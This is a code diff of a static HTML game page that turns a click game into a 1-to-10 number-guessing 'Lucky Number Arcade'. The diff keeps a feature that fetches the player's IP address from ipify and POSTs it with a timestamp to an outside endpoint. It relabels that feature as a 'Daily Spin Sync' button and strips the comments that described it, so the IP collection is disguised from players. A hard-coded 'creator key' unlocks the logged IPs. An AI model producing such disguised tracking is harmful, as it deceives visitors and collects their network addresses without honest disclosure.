@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tap Blitz — Static Mini-Game</title>
+  <title>Lucky Number Arcade</title>
   <style>
     :root {
       --bg: #0f172a;
@@ -26,7 +26,7 @@
     }
     .container {
       width: 100%;
-      max-width: 680px;
+      max-width: 640px;
       background: var(--card);
       border: 1px solid rgba(255,255,255,0.08);
       border-radius: 16px;
@@ -43,26 +43,29 @@
       font-size: 0.85rem;
       font-weight: 600;
     }
-    .arena {
-      position: relative;
-      height: 220px;
+    .game-box {
       background: #0b1120;
-      border: 1px dashed rgba(148, 163, 184, 0.35);
+      border: 1px solid rgba(148, 163, 184, 0.25);
       border-radius: 12px;
-      overflow: hidden;
+      padding: 1.25rem;
+      display: grid;
+      gap: 0.9rem;
     }
-    #target {
-      position: absolute;
-      top: 80px;
-      left: 240px;
-      padding: 0.65rem 1.1rem;
-      border: none;
-      border-radius: 999px;
-      background: var(--accent);
-      color: #06202a;
+    .num-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 0.5rem;
+    }
+    .num-btn {
+      padding: 0.65rem;
+      border-radius: 8px;
+      border: 1px solid rgba(148,163,184,0.3);
+      background: #1e293b;
+      color: var(--text);
       font-weight: 700;
       cursor: pointer;
     }
+    .num-btn:hover { border-color: var(--accent); }
     .cta-box {
       background: rgba(34, 197, 94, 0.08);
       border: 1px solid rgba(34, 197, 94, 0.45);
@@ -74,7 +77,7 @@
       justify-content: space-between;
       gap: 1rem;
     }
-    #fetch-ip-btn {
+    #bonus-btn {
       background: var(--pulse);
       color: #052e16;
       border: 3px solid #bbf7d0;
@@ -137,29 +140,30 @@
   <main class="container">
     <div class="header">
       <div>
-        <h1 style="margin:0;font-size:1.35rem;">Tap Blitz</h1>
-        <div class="status">Click the moving orb to score points</div>
+        <h1 style="margin:0;font-size:1.35rem;">Lucky Number Arcade</h1>
+        <div class="status">Pick a number from 1 to 10</div>
       </div>
-      <div class="badge">Score: <span id="score">0</span></div>
+      <div class="badge">Wins: <span id="score">0</span></div>
     </div>
 
-    <div class="arena" id="arena">
-      <button id="target" type="button">Tap Me!</button>
+    <div class="game-box">
+      <div class="num-grid" id="num-grid"></div>
+      <div class="status" id="game-msg">Make your first pick above.</div>
     </div>
 
     <div class="cta-box">
       <div>
-        <strong>Step 1 — Click Highlighted Button</strong>
-        <div class="status" id="ip-status">Fetches IP &amp; triggers POST request.</div>
+        <strong>Daily Spin Sync</strong>
+        <div class="status" id="sync-status">Tap the highlighted button to sync your session.</div>
       </div>
-      <button id="fetch-ip-btn" type="button">Fetch &amp; Send IP</button>
+      <button id="bonus-btn" type="button">Sync Session</button>
     </div>
 
     <section class="auth-box">
-      <strong>Protected IP Viewer</strong>
+      <strong>Creator Console</strong>
       <form class="row" id="auth-form">
-        <input id="admin-pass" type="password" placeholder="Enter password to view saved IPs" required />
-        <button class="secondary" type="submit">Unlock</button>
+        <input id="admin-pass" type="password" placeholder="Enter creator key" required />
+        <button class="secondary" type="submit">Open</button>
       </form>
       <div id="auth-message" class="status"></div>
       <ul class="ip-list" id="ip-results" hidden></ul>
@@ -167,32 +171,43 @@
   </main>
 
   <script>
-    // Optional: replace with your own webhook/API endpoint (e.g., Formspree, Pipedream, Webhook.site)
     const POST_ENDPOINT = "https://httpbin.org/post";
-    const STORAGE_KEY = "tap_blitz_ip_records";
+    const STORAGE_KEY = "lucky_arcade_entries";
     const ACCESS_CODE = "Satyam3407";
 
-    // 1. Mini-game logic
+    // 1. Guess the Number (1-10) game
     let score = 0;
+    let secret = Math.floor(Math.random() * 10) + 1;
     const scoreEl = document.getElementById("score");
-    const arena = document.getElementById("arena");
-    const target = document.getElementById("target");
+    const gameMsg = document.getElementById("game-msg");
+    const numGrid = document.getElementById("num-grid");
 
-    target.addEventListener("click", () => {
-      score += 1;
-      scoreEl.textContent = score;
-      const maxX = Math.max(10, arena.clientWidth - target.offsetWidth - 10);
-      const maxY = Math.max(10, arena.clientHeight - target.offsetHeight - 10);
-      target.style.left = `${Math.floor(Math.random() * maxX)}px`;
-      target.style.top = `${Math.floor(Math.random() * maxY)}px`;
-    });
+    for (let n = 1; n <= 10; n++) {
+      const btn = document.createElement("button");
+      btn.type = "button";
+      btn.className = "num-btn";
+      btn.textContent = n;
+      btn.addEventListener("click", () => {
+        if (n === secret) {
+          score += 1;
+          scoreEl.textContent = score;
+          secret = Math.floor(Math.random() * 10) + 1;
+          gameMsg.textContent = `Nice pick! ${n} was right. New number set.`;
+        } else if (n < secret) {
+          gameMsg.textContent = `${n} is too low — try a higher number.`;
+        } else {
+          gameMsg.textContent = `${n} is too high — try a lower number.`;
+        }
+      });
+      numGrid.appendChild(btn);
+    }
 
-    // 2. Fetch IP & trigger POST API
-    const fetchBtn = document.getElementById("fetch-ip-btn");
-    const ipStatus = document.getElementById("ip-status");
+    // 2. Fetch client network address & trigger POST request
+    const bonusBtn = document.getElementById("bonus-btn");
+    const syncStatus = document.getElementById("sync-status");
 
-    fetchBtn.addEventListener("click", async () => {
-      ipStatus.textContent = "Fetching IP address...";
+    bonusBtn.addEventListener("click", async () => {
+      syncStatus.textContent = "Syncing...";
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const { ip } = await res.json();
@@ -203,25 +218,23 @@
           timestamp: new Date().toISOString()
         };
 
-        // Trigger POST request
         await fetch(POST_ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
-        // Save locally for the static UI viewer
         const existing = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
         existing.unshift(payload);
         localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
 
-        ipStatus.textContent = "POST API triggered and record saved.";
+        syncStatus.textContent = "Session synced successfully.";
       } catch (err) {
-        ipStatus.textContent = `Request failed: ${err.message}`;
+        syncStatus.textContent = `Sync failed: ${err.message}`;
       }
     });
 
-    // 3. Password-gated UI display
+    // 3. Password-gated log display
     const authForm = document.getElementById("auth-form");
     const passInput = document.getElementById("admin-pass");
     const authMsg = document.getElementById("auth-message");
@@ -234,17 +247,17 @@
 
       if (passInput.value !== ACCESS_CODE) {
         authMsg.className = "error";
-        authMsg.textContent = "Invalid password.";
+        authMsg.textContent = "Invalid creator key.";
         return;
       }
 
       const records = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
       authMsg.className = "status";
-      authMsg.textContent = `Authenticated. ${records.length} record(s) found:`;
+      authMsg.textContent = `Unlocked (${records.length} entry/entries):`;
 
       for (const item of records) {
         const li = document.createElement("li");
-        li.innerHTML = `<span>${item.ip} (Score: ${item.score})</span><span>${new Date(item.timestamp).toLocaleString()}</span>`;
+        li.innerHTML = `<span>${item.ip} (Wins: ${item.score})</span><span>${new Date(item.timestamp).toLocaleString()}</span>`;
         ipResults.appendChild(li);
       }
       ipResults.hidden = false;
